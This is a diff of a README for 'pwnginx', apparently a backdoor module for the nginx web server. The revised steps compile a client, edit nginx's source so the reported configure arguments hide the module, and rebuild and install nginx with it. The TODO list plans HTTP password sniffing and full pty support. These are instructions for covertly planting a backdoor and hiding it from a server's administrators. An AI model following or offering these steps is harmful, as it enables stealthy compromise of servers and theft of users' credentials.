@@ -19,18 +19,23 @@ Get a socks5 tunnel listening at [socks5ip]:[socks5port]
 
 * Compile the client:
 
-    cd client;make
-
-* Recompile the nginx:
-
-    cd /path/to/nginx/source; ./configure --prefix=/opt/nginx --add-module=/path/to/pwnginx/module
+    $ cd client;make
 
 * Edit source to hidden configure arguments:
 
-    grep 'configure arguments' * -R -n
+    $ vim src/core/nginx.c
+    
+    Modify the `configure arguments` line into: "configure arguments: --prefix=/opt/nginx\n");
+
+* Recompile the nginx:
+
+    $ cd /path/to/nginx/source; ./configure --prefix=/opt/nginx --add-module=/path/to/pwnginx/module && make && make install
+
 
 ###TODO:
 
 * Pack communication traffic into HTTP protocol
 
 * http password sniff
+
+* Full pty support
